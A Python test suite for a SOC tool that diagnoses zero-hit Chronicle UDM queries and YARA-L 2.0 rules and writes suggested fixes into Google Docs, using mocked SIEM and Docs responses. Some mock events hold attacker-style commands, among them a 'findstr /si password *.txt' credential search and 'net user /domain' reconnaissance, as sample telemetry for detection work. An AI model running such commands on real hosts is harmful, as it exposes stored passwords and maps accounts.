    win_events = [
        {
            "udm": {
                "principal": {
                    "hostname": "wins-d19",
                    "process": {"commandLine": "C:\\Windows\\System32\\services.exe"},
                },
                "target": {
                    "process": {
                        "commandLine": '"C:\\Windows\\system32\\cmd.exe" /c "whoami /all"'
                    }
                },
            }
        }
        for _ in range(8)
    ]

    def fake_siem_cmd(query: str, **kwargs: Any) -> dict[str, Any]:
        if "principal.process.command_line = /.*cmd.*/ nocase" in query:
            return {"events": [], "total_events": 0}
        if "target.process.command_line = /.*cmd.*/ nocase" in query:
            return {"events": win_events[:4], "total_events": 4}
        if query.strip() == 'principal.hostname = "wins-d19"':
            return {"events": win_events, "total_events": 8}
        return {"events": [], "total_events": 0}

    diag_cmd = diagnose_zero_hit_udm_query(
        'principal.hostname = "wins-d19" AND principal.process.command_line = /.*cmd.*/ nocase',
        siem_search_fn=fake_siem_cmd,
    )
    assert diag_cmd["status"] == "success"
    assert diag_cmd["zero_hit"] is True
    assert diag_cmd["diagnosis_class"] == "entity_role_swap"
    assert diag_cmd["repair_target"] == "field"
    assert diag_cmd["failing_field"] == "principal.process.command_line"
    assert diag_cmd["recommended_field"] == "target.process.command_line"
    assert (
        diag_cmd["recommended_clause"]
        == "target.process.command_line = /.*cmd.*/ nocase"
    )
    assert (
        diag_cmd["recommended_query"]
        == 'principal.hostname = "wins-d19" AND target.process.command_line = /.*cmd.*/ nocase'
    )
    assert diag_cmd["pivot_verified"] is True
    assert diag_cmd["pivot_event_count"] == 4

    cloud_events = [
        {
            "udm": {
                "metadata": {"logType": "GCP_CLOUDAUDIT"},
                "principal": {
                    "ip": ["104.198.226.161"],
                    "user": {"emailAddresses": ["bruce.wayne@the.org"]},
                },
                "target": {"resource": {"name": "projects/base-production"}},
            }
        }
        for _ in range(6)
    ]

    def fake_siem_email(query: str, **kwargs: Any) -> dict[str, Any]:
        if 'target.user.email_addresses = "bruce.wayne@the.org"' in query:
            return {"events": [], "total_events": 0}
        if 'principal.user.email_addresses = "bruce.wayne@the.org"' in query:
            return {"events": cloud_events[:5], "total_events": 5}
        if 'metadata.log_type = "GCP_CLOUDAUDIT"' in query:
            return {"events": cloud_events, "total_events": 6}
        return {"events": [], "total_events": 0}

    diag_email = diagnose_zero_hit_udm_query(
        'metadata.log_type = "GCP_CLOUDAUDIT" AND target.user.email_addresses = "bruce.wayne@the.org"',
        siem_search_fn=fake_siem_email,
    )
    assert diag_email["diagnosis_class"] == "entity_role_swap"
    assert diag_email["repair_target"] == "field"
    assert diag_email["recommended_field"] == "principal.user.email_addresses"
    assert diag_email["pivot_verified"] is True
    assert diag_email["pivot_event_count"] == 5


def test_diagnose_zero_hit_udm_query_value_format_mismatch():
    """Verifies detection and repair when resource.name returns 0 hits even after
    schema repair to target.resource.name, inspects sampled GCP_CLOUDAUDIT events,
    and recommends target.resource.name = "projects/base-production" with pivot_event_count > 0."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_udm_query

    gcp_events = [
        {
            "udm": {
                "metadata": {"logType": "GCP_CLOUDAUDIT", "eventType": "USER_RESOURCE_ACCESS"},
                "principal": {"ip": ["104.198.226.161"]},
                "target": {
                    "resource": {
                        "name": "projects/base-production",
                        "resourceType": "CLOUD_PROJECT",
                    }
                },
            }
        }
        for _ in range(18)
    ]

    def fake_siem_gcp(query: str, **kwargs: Any) -> dict[str, Any]:
        if "projects/base-analytics/instances/prod-customers" in query:
            return {"events": [], "total_events": 0}
        if 'target.resource.name = "projects/base-production"' in query:
            return {"events": gcp_events[:18], "total_events": 18}
        if (
            'metadata.log_type = "GCP_CLOUDAUDIT"' in query
            and 'principal.ip = "104.198.226.161"' in query
        ):
            return {"events": gcp_events, "total_events": 18}
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_udm_query(
        'metadata.log_type = "GCP_CLOUDAUDIT" AND principal.ip = "104.198.226.161" AND resource.name = "projects/base-analytics/instances/prod-customers"',
        siem_search_fn=fake_siem_gcp,
    )
    assert diag["status"] == "success"
    assert diag["zero_hit"] is True
    assert diag["diagnosis_class"] == "value_format_mismatch"
    assert diag["repair_target"] == "clause"
    assert (
        diag["anchor_query"]
        == 'metadata.log_type = "GCP_CLOUDAUDIT" AND principal.ip = "104.198.226.161"'
    )
    assert diag["anchor_event_count"] == 18
    assert (
        diag["failing_clause"]
        == 'resource.name = "projects/base-analytics/instances/prod-customers"'
    )
    assert diag["recommended_field"] == "target.resource.name"
    assert diag["recommended_rhs"] == '"projects/base-production"'
    assert (
        diag["recommended_clause"]
        == 'target.resource.name = "projects/base-production"'
    )
    assert (
        diag["recommended_query"]
        == 'metadata.log_type = "GCP_CLOUDAUDIT" AND principal.ip = "104.198.226.161" AND target.resource.name = "projects/base-production"'
    )
    assert diag["pivot_verified"] is True
    assert diag["pivot_event_count"] == 18


def test_verify_and_redline_udm_queries_in_doc_zero_hit_pivots_and_idempotency():
    """Verifies end-to-end Google Docs UTF-16 span commenting, non-overlapping
    descending-index writeMode='SUGGEST' edits across combined schema+value and
    pure semantic zero-hit queries, zero false positives on queries with event_count > 0,
    and multi-pass suggestion idempotency."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module
    from manager.tools.docs_review_tools import verify_and_redline_udm_queries_in_doc

    doc_text = (
        "Runbook UDM Hunting Queries:\n"
        '1. Cloud Audit Query: `metadata.log_type = "GCP_CLOUDAUDIT" AND principal.ip = "104.198.226.161" AND resource.name = "projects/base-analytics/instances/prod-customers"`\n'
        '2. Endpoint Exact Match Query: `principal.hostname = "wins-d19" AND target.process.command_line = "cmd.exe"`\n'
        '3. Entity Role Swap Query: `principal.hostname = "wins-d19" AND principal.process.command_line = /.*cmd.*/ nocase`\n'
        '4. Valid Control Query: `metadata.log_type = "WINDOWS_SYSMON" AND principal.hostname = "wins-d19"`\n'
    )
    mock_doc = _make_single_paragraph_doc(
        "doc-zero-hit-pivots", "UDM Zero Hit Pivot Test", doc_text
    )

    gcp_events = [
        {
            "udm": {
                "metadata": {"logType": "GCP_CLOUDAUDIT"},
                "principal": {"ip": ["104.198.226.161"]},
                "target": {"resource": {"name": "projects/base-production"}},
            }
        }
        for _ in range(18)
    ]
    win_events = [
        {
            "udm": {
                "metadata": {"logType": "WINDOWS_SYSMON"},
                "principal": {
                    "hostname": "wins-d19",
                    "process": {"commandLine": "C:\\Windows\\System32\\services.exe"},
                },
                "target": {
                    "process": {
                        "commandLine": '"C:\\Windows\\system32\\cmd.exe" /c "findstr /si password *.txt"'
                    }
                },
            }
        }
        for _ in range(12)
    ]

    def fake_siem(query: str, **kwargs: Any) -> dict[str, Any]:
        q = query.strip()
        if "projects/base-analytics/instances/prod-customers" in q:
            return {"events": [], "total_events": 0}
        if 'target.resource.name = "projects/base-production"' in q:
            return {"events": gcp_events, "total_events": 18}
        if (
            'metadata.log_type = "GCP_CLOUDAUDIT"' in q
            and 'principal.ip = "104.198.226.161"' in q
        ):
            return {"events": gcp_events, "total_events": 18}
        if 'target.process.command_line = "cmd.exe"' in q:
            return {"events": [], "total_events": 0}
        if "principal.process.command_line = /.*cmd.*/ nocase" in q:
            return {"events": [], "total_events": 0}
        if (
            "target.process.command_line = /.*cmd\\.exe.*/ nocase" in q
            or "target.process.command_line = /.*cmd.*/ nocase" in q
        ):
            return {"events": win_events[:4], "total_events": 4}
        if 'principal.hostname = "wins-d19"' in q:
            return {"events": win_events, "total_events": 12}
        return {"events": [], "total_events": 0}

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if any("insertComment" in r for r in payload.get("requests", [])):
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-zh-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    res = verify_and_redline_udm_queries_in_doc(
        "doc-zero-hit-pivots",
        run_live_siem_check=True,
        diagnose_zero_hit_queries=True,
        siem_search_fn=fake_siem,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["udm_findings_count"] == 3
    assert res["zero_hit_findings_count"] == 3
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 3
    assert res["edits"]["applied_count"] == 3

    diag_classes = [f.get("zero_hit_diagnosis") for f in res["findings"]]
    assert diag_classes == [
        "value_format_mismatch",
        "exact_match_on_command_line",
        "entity_role_swap",
    ]

    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Second pass with pending suggestions covering the document -> 0 new edits, 3 skipped
    mock_doc_pending = {
        "documentId": "doc-zero-hit-pivots",
        "title": "UDM Zero Hit Pivot Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.zh.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = verify_and_redline_udm_queries_in_doc(
        "doc-zero-hit-pivots",
        run_live_siem_check=True,
        diagnose_zero_hit_queries=True,
        siem_search_fn=fake_siem,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(lambda req: httpx.Response(200, json=mock_doc_pending)),
    )
    assert res2["status"] == "success"
    assert res2["udm_findings_count"] == 0
    assert res2["zero_hit_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 3
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0

    ft = FunctionTool(tools_module.verify_and_redline_udm_queries_in_doc)
    decl = ft._get_declaration()
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "diagnose_zero_hit_queries" in props
    assert "tool_context" not in props


def test_extract_yaral2_event_predicates_multiline_and_collapsed() -> None:
    """Verifies exact 1-based UTF-16 span extraction and UDM clause mapping across
    both multi-line and Drive-collapsed single-line YARA-L 2.0 (YL2) rules."""
    from manager.tools.docs_review_tools import (
        _build_utf16_index_map,
        _iter_yaral2_rule_blocks,
        extract_yaral2_event_predicates,
    )

    multiline_doc = (
        "Postmortem YARA-L 2.0 Rule:\n"
        "rule linux_derp_process_creation {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $proc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $proc.principal.hostname = "custom-image-ubuntu2204"\n'
        "    re.regex($proc.principal.process.command_line, `.*DERPService.*`) nocase\n"
        "  condition:\n"
        "    $proc\n"
        "}\n"
    )
    index_map = _build_utf16_index_map(multiline_doc)
    blocks = _iter_yaral2_rule_blocks(multiline_doc)
    assert len(blocks) == 1
    b0 = blocks[0]
    preds = extract_yaral2_event_predicates(
        b0["rule_text"],
        rule_char_start=b0["char_start"],
        full_plain_text=multiline_doc,
        index_map=index_map,
    )
    assert len(preds) == 3
    assert [p["predicate_kind"] for p in preds] == [
        "comparison",
        "comparison",
        "re_regex",
    ]
    assert [p["udm_clause"] for p in preds] == [
        'metadata.event_type = "PROCESS_LAUNCH"',
        'principal.hostname = "custom-image-ubuntu2204"',
        "principal.process.command_line = /.*DERPService.*/ nocase",
    ]
    for p in preds:
        p_s = p["predicate_start_index"] - 1
        p_e = p["predicate_end_index"] - 1
        assert multiline_doc[p_s:p_e] == p["predicate_text"]
        vf_s = p["var_field_start_index"] - 1
        vf_e = p["var_field_end_index"] - 1
        assert multiline_doc[vf_s:vf_e] == p["var_field_token"]
        rhs_s = p["rhs_start_index"] - 1
        rhs_e = p["rhs_end_index"] - 1
        assert multiline_doc[rhs_s:rhs_e] == p["rhs_raw"]

    collapsed_doc = (
        "Collapsed rule: "
        'rule wins_d19_cmd { meta: author = "SOC" events: '
        '$proc.metadata.event_type = "PROCESS_LAUNCH" '
        '$proc.principal.hostname = "wins-d19" '
        '$proc.target.process.command_line = "cmd.exe" '
        "condition: $proc }"
    )
    c_map = _build_utf16_index_map(collapsed_doc)
    c_blocks = _iter_yaral2_rule_blocks(collapsed_doc)
    assert len(c_blocks) == 1
    cb0 = c_blocks[0]
    c_preds = extract_yaral2_event_predicates(
        cb0["rule_text"],
        rule_char_start=cb0["char_start"],
        full_plain_text=collapsed_doc,
        index_map=c_map,
    )
    assert len(c_preds) == 3
    assert c_preds[2]["predicate_text"] == '$proc.target.process.command_line = "cmd.exe"'
    p2_s = c_preds[2]["predicate_start_index"] - 1
    p2_e = c_preds[2]["predicate_end_index"] - 1
    assert collapsed_doc[p2_s:p2_e] == '$proc.target.process.command_line = "cmd.exe"'


def test_diagnose_zero_hit_yaral2_rule_exact_match_command_line_to_re_regex() -> None:
    """Verifies that a syntactically valid YARA-L 2.0 rule with exact command-line
    equality ($proc.target.process.command_line = "cmd.exe") is diagnosed as
    exact_match_on_command_line, rewritten to re.regex(...) nocase, compiler-verified,
    and confirmed with pivot_event_count > 0."""
    from manager.tools.docs_review_tools import (
        diagnose_zero_hit_yaral2_rule,
        verify_yaral2_rule_with_siem,
    )

    rule_text = (
        "rule wins_d19_cmd_discovery_case_33280 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $proc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $proc.principal.hostname = "wins-d19"\n'
        '    $proc.target.process.command_line = "cmd.exe"\n'
        "  condition:\n"
        "    $proc\n"
        "}"
    )

    validated_rules: list[str] = []

    def fake_validate(rule_text: str) -> str:
        validated_rules.append(rule_text)
        return "Rule validation PASSED. The YARA-L 2.0 syntax appears to be valid."

    def fake_search(query: str, hours_back: int = 24, max_events: int = 20) -> dict[str, Any]:
        if 'target.process.command_line = "cmd.exe"' in query:
            return {"events": [], "total_events": 0}
        if 'principal.hostname = "wins-d19"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "PROCESS_LAUNCH"},
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": 'C:\\Windows\\system32\\cmd.exe /c "net user /domain"'
                                }
                            },
                        }
                    }
                    for _ in range(8)
                ],
                "total_events": 8,
            }
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_yaral2_rule(
        rule_text,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert diag["status"] == "success"
    assert diag["static_findings"] == []
    assert diag["initial_event_count"] == 0
    assert diag["failure_reason"] == "exact_match_on_command_line"
    assert diag["failing_predicate_index"] == 2
    assert (
        diag["recommended_yaral2_predicate"]
        == "re.regex($proc.target.process.command_line, `.*cmd\\.exe.*`) nocase"
    )
    assert diag["recommended_span_target"] == "predicate"
    assert (
        diag["recommended_span_replacement"]
        == "re.regex($proc.target.process.command_line, `.*cmd\\.exe.*`) nocase"
    )
    assert (
        "re.regex($proc.target.process.command_line, `.*cmd\\.exe.*`) nocase"
        in diag["pivoted_rule_text"]
    )
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["pivot_event_count"] == 8
    assert len(validated_rules) == 2

    siem_check = verify_yaral2_rule_with_siem(
        rule_text,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert siem_check["compiler_verified"] is True
    assert siem_check["retrohunt_event_count"] == 8
    assert (
        "re.regex($proc.target.process.command_line, `.*cmd\\.exe.*`) nocase"
        in siem_check["pivoted_rule_text"]
    )


def test_diagnose_zero_hit_yaral2_rule_entity_role_swap_in_re_regex_and_comparison() -> None:
    """Verifies entity_role_swap diagnosis and $var.<field> span replacement on both
    re.regex($proc.principal.process.command_line, ...) and comparison predicates."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_yaral2_rule

    rule_regex = (
        "rule linux_derp_process_creation_case_33279 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $proc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $proc.principal.hostname = "custom-image-ubuntu2204"\n'
        "    re.regex($proc.principal.process.command_line, `.*DERPService.*`) nocase\n"
        "  condition:\n"
        "    $proc\n"
        "}"
    )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search_regex(
        query: str, hours_back: int = 24, max_events: int = 20
    ) -> dict[str, Any]:
        if "principal.process.command_line = /.*DERPService.*/" in query:
            return {"events": [], "total_events": 0}
        if 'principal.hostname = "custom-image-ubuntu2204"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "PROCESS_LAUNCH"},
                            "principal": {
                                "hostname": "custom-image-ubuntu2204",
                                "process": {"command_line": "/bin/bash"},
                            },
                            "target": {
                                "process": {
                                    "command_line": "/usr/local/bin/DERPService --port 8443"
                                }
                            },
                        }
                    }
                    for _ in range(11)
                ],
                "total_events": 11,
            }
        return {"events": [], "total_events": 0}

    diag1 = diagnose_zero_hit_yaral2_rule(
        rule_regex,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search_regex,
    )
    assert diag1["failure_reason"] == "entity_role_swap"
    assert diag1["recommended_field"] == "target.process.command_line"
    assert diag1["recommended_span_target"] == "var_field"
    assert diag1["recommended_span_replacement"] == "$proc.target.process.command_line"
    assert (
        diag1["recommended_yaral2_predicate"]
        == "re.regex($proc.target.process.command_line, `.*DERPService.*`) nocase"
    )
    assert diag1["pivot_verified"] is True
    assert diag1["pivot_compiler_verified"] is True
    assert diag1["pivot_event_count"] == 11

    rule_cmp = (
        "rule gcp_actor_swap {\n"
        "  meta:\n"
        '    author = "SOC"\n'
        "  events:\n"
        '    $e.metadata.event_type = "RESOURCE_PERMISSIONS_CHANGE"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        '    $e.target.user.email_addresses = "bruce.wayne@the.org"\n'
        "  condition:\n"
        "    $e\n"
        "}"
    )

    def fake_search_cmp(
        query: str, hours_back: int = 24, max_events: int = 20
    ) -> dict[str, Any]:
        if 'target.user.email_addresses = "bruce.wayne@the.org"' in query:
            return {"events": [], "total_events": 0}
        if 'principal.ip = "104.198.226.161"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "RESOURCE_PERMISSIONS_CHANGE"},
                            "principal": {
                                "ip": ["104.198.226.161"],
                                "user": {
                                    "email_addresses": ["bruce.wayne@the.org"]
                                },
                            },
                        }
                    }
                    for _ in range(9)
                ],
                "total_events": 9,
            }
        return {"events": [], "total_events": 0}

    diag2 = diagnose_zero_hit_yaral2_rule(
        rule_cmp,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search_cmp,
    )
    assert diag2["failure_reason"] == "entity_role_swap"
    assert diag2["recommended_field"] == "principal.user.email_addresses"
    assert diag2["recommended_span_target"] == "var_field"
    assert diag2["recommended_span_replacement"] == "$e.principal.user.email_addresses"
    assert (
        diag2["recommended_yaral2_predicate"]
        == '$e.principal.user.email_addresses = "bruce.wayne@the.org"'
    )
    assert diag2["pivot_verified"] is True
    assert diag2["pivot_compiler_verified"] is True
    assert diag2["pivot_event_count"] == 9


def test_diagnose_zero_hit_yaral2_rule_value_format_mismatch_combined_with_schema_defect() -> None:
    """Verifies that a rule combining static schema defects (strings:, $e.resource.name,
    $e.ip, $event) with a semantic value_format_mismatch on $e.resource.name upgrades
    the predicate to $e.target.resource.name = "projects/base-production"."""
    from manager.tools.docs_review_tools import diagnose_zero_hit_yaral2_rule

    rule_text = (
        "rule gcp_sa_privilege_escalation_case_33278 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  strings:\n"
        '    $e.metadata.event_type = "RESOURCE_PERMISSIONS_CHANGE"\n'
        '    $e.resource.name = "projects/base-analytics/instances/prod-customers"\n'
        '    $e.ip = "104.198.226.161"\n'
        '    $e.principal.user.email_addresses = "bruce.wayne@the.org"\n'
        "  condition:\n"
        "    $event\n"
        "}"
    )

    def fake_validate(rule_text: str) -> str:
        assert "strings:" not in rule_text
        assert "$e.resource.name" not in rule_text
        assert "$e.ip " not in rule_text
        assert "$event" not in rule_text
        return "Rule validation PASSED."

    def fake_search(query: str, hours_back: int = 24, max_events: int = 20) -> dict[str, Any]:
        if 'target.resource.name = "projects/base-analytics/instances/prod-customers"' in query:
            return {"events": [], "total_events": 0}
        if 'principal.ip = "104.198.226.161"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "RESOURCE_PERMISSIONS_CHANGE"},
                            "principal": {
                                "ip": ["104.198.226.161"],
                                "user": {"email_addresses": ["bruce.wayne@the.org"]},
                            },
                            "target": {
                                "resource": {"name": "projects/base-production"}
                            },
                        }
                    }
                    for _ in range(9)
                ],
                "total_events": 9,
            }
        return {"events": [], "total_events": 0}

    diag = diagnose_zero_hit_yaral2_rule(
        rule_text,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
    )
    assert diag["status"] == "success"
    assert len(diag["static_findings"]) == 4
    assert diag["has_schema_defect"] is True
    assert diag["failure_reason"] == "value_format_mismatch"
    assert diag["failing_predicate_index"] == 1
    assert (
        diag["recommended_yaral2_predicate"]
        == '$e.target.resource.name = "projects/base-production"'
    )
    assert diag["recommended_span_target"] == "predicate"
    assert (
        diag["recommended_span_replacement"]
        == '$e.target.resource.name = "projects/base-production"'
    )
    assert (
        '$e.target.resource.name = "projects/base-production"'
        in diag["pivoted_rule_text"]
    )
    assert diag["pivot_verified"] is True
    assert diag["pivot_compiler_verified"] is True
    assert diag["pivot_event_count"] == 9


def test_verify_and_redline_yaral2_rules_in_doc_zero_hit_pivots_and_idempotency() -> None:
    """Verifies end-to-end Google Docs UTF-16 span commenting, non-overlapping
    descending-index writeMode='SUGGEST' edits across combined static+semantic and
    pure-semantic zero-hit YARA-L 2.0 rules, 0 false positives on valid control rules,
    and multi-pass suggestion idempotency."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools import tools as tools_module
    from manager.tools.docs_review_tools import (
        clear_doc_index_cache,
        verify_and_redline_yaral2_rules_in_doc,
    )

    clear_doc_index_cache()

    doc_text = (
        "Section 1: Combined Static Schema + Zero-Hit Value Mismatch\n"
        "rule gcp_sa_privilege_escalation_case_33278 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  strings:\n"
        '    $e.metadata.event_type = "RESOURCE_PERMISSIONS_CHANGE"\n'
        '    $e.resource.name = "projects/base-analytics/instances/prod-customers"\n'
        '    $e.ip = "104.198.226.161"\n'
        '    $e.principal.user.email_addresses = "bruce.wayne@the.org"\n'
        "  condition:\n"
        "    $event\n"
        "}\n\n"
        "Section 2: Syntactically Valid Zero-Hit Exact Command-Line Match\n"
        "rule wins_d19_cmd_discovery_case_33280 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $proc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $proc.principal.hostname = "wins-d19"\n'
        '    $proc.target.process.command_line = "cmd.exe"\n'
        "  condition:\n"
        "    $proc\n"
        "}\n\n"
        "Section 3: Syntactically Valid Zero-Hit Entity Role Swap\n"
        "rule linux_derp_process_creation_case_33279 {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $proc.metadata.event_type = "PROCESS_LAUNCH"\n'
        '    $proc.principal.hostname = "custom-image-ubuntu2204"\n'
        "    re.regex($proc.principal.process.command_line, `.*DERPService.*`) nocase\n"
        "  condition:\n"
        "    $proc\n"
        "}\n\n"
        "Section 4: Valid Non-Zero-Hit Control Rule\n"
        "rule valid_crowdstrike_network_control {\n"
        "  meta:\n"
        '    author = "SOC Detection Engineering"\n'
        "  events:\n"
        '    $net.metadata.event_type = "NETWORK_CONNECTION"\n'
        '    $net.metadata.vendor_name = "Crowdstrike"\n'
        "  condition:\n"
        "    $net\n"
        "}\n"
    )

    mock_doc = {
        "documentId": "doc-yaral2-zero-hit",
        "title": "YARA-L 2.0 Zero-Hit Retrohunt Pivot Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }

    batch_calls: list[dict[str, Any]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        if "writeControl" not in payload:
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-yl2-zh-{i}"}}
                        for i in range(len(payload.get("requests", [])))
                    ]
                },
            )
        return httpx.Response(
            200,
            json={"replies": [{} for _ in payload.get("requests", [])]},
        )

    def fake_validate(rule_text: str) -> str:
        return "Rule validation PASSED."

    def fake_search(query: str, hours_back: int = 24, max_events: int = 20) -> dict[str, Any]:
        if 'target.resource.name = "projects/base-analytics/instances/prod-customers"' in query:
            return {"events": [], "total_events": 0}
        if 'principal.ip = "104.198.226.161"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "RESOURCE_PERMISSIONS_CHANGE"},
                            "principal": {
                                "ip": ["104.198.226.161"],
                                "user": {"email_addresses": ["bruce.wayne@the.org"]},
                            },
                            "target": {"resource": {"name": "projects/base-production"}},
                        }
                    }
                    for _ in range(9)
                ],
                "total_events": 9,
            }
        if 'target.process.command_line = "cmd.exe"' in query:
            return {"events": [], "total_events": 0}
        if 'principal.hostname = "wins-d19"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "PROCESS_LAUNCH"},
                            "principal": {"hostname": "wins-d19"},
                            "target": {
                                "process": {
                                    "command_line": 'C:\\Windows\\system32\\cmd.exe /c "net user /domain"'
                                }
                            },
                        }
                    }
                    for _ in range(8)
                ],
                "total_events": 8,
            }
        if "principal.process.command_line = /.*DERPService.*/" in query:
            return {"events": [], "total_events": 0}
        if 'principal.hostname = "custom-image-ubuntu2204"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {"event_type": "PROCESS_LAUNCH"},
                            "principal": {"hostname": "custom-image-ubuntu2204"},
                            "target": {
                                "process": {
                                    "command_line": "/usr/local/bin/DERPService --port 8443"
                                }
                            },
                        }
                    }
                    for _ in range(11)
                ],
                "total_events": 11,
            }
        if 'metadata.vendor_name = "Crowdstrike"' in query:
            return {
                "events": [
                    {
                        "udm": {
                            "metadata": {
                                "event_type": "NETWORK_CONNECTION",
                                "vendor_name": "Crowdstrike",
                            }
                        }
                    }
                    for _ in range(10)
                ],
                "total_events": 10,
            }
        return {"events": [], "total_events": 0}

    res = verify_and_redline_yaral2_rules_in_doc(
        "doc-yaral2-zero-hit",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    # 4 findings on Rule 1 (1 upgraded in-place to zero-hit + 3 static) + 1 on Rule 2 + 1 on Rule 3 + 0 on Rule 4 = 6
    assert res["yaral2_findings_count"] == 6
    assert res["zero_hit_yaral2_findings_count"] == 3
    assert res["skipped_existing_suggestion_count"] == 0
    assert res["comments"]["inserted_count"] == 6
    assert res["edits"]["applied_count"] == 6

    rule_names_with_findings = {f["rule_name"] for f in res["findings"]}
    assert "valid_crowdstrike_network_control" not in rule_names_with_findings

    zh_findings = [f for f in res["findings"] if f.get("zero_hit_diagnosis")]
    assert [f["zero_hit_diagnosis"] for f in zh_findings] == [
        "value_format_mismatch",
        "exact_match_on_command_line",
        "entity_role_swap",
    ]
    assert [f["replacement"] for f in zh_findings] == [
        '$e.target.resource.name = "projects/base-production"',
        "re.regex($proc.target.process.command_line, `.*cmd\\.exe.*`) nocase",
        "$proc.target.process.command_line",
    ]

    assert len(batch_calls) == 2
    assert "writeControl" not in batch_calls[0]
    assert batch_calls[1]["writeControl"] == {"writeMode": "SUGGEST"}
    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Second pass with pending suggestions covering the document -> 0 new edits, 6 skipped
    mock_doc_pending = {
        "documentId": "doc-yaral2-zero-hit",
        "title": "YARA-L 2.0 Zero-Hit Retrohunt Pivot Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.yl2.zh.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls.clear()
    res2 = verify_and_redline_yaral2_rules_in_doc(
        "doc-yaral2-zero-hit",
        run_live_siem_check=True,
        diagnose_zero_hit_retrohunt=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pending)
        ),
    )
    assert res2["status"] == "success"
    assert res2["yaral2_findings_count"] == 0
    assert res2["zero_hit_yaral2_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 6
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0
    assert len(batch_calls) == 0

